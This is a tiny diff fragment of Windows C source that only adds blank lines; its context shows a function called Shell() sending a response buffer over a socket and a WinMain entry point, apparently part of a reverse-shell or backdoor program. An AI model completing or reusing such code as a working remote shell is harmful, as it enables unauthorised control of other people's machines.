@@ -40,7 +40,9 @@ void Shell() {
       send(sock, total_response, sizeof(total_response), 0);
       fclose(fp);
     }
+
   }
+  
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
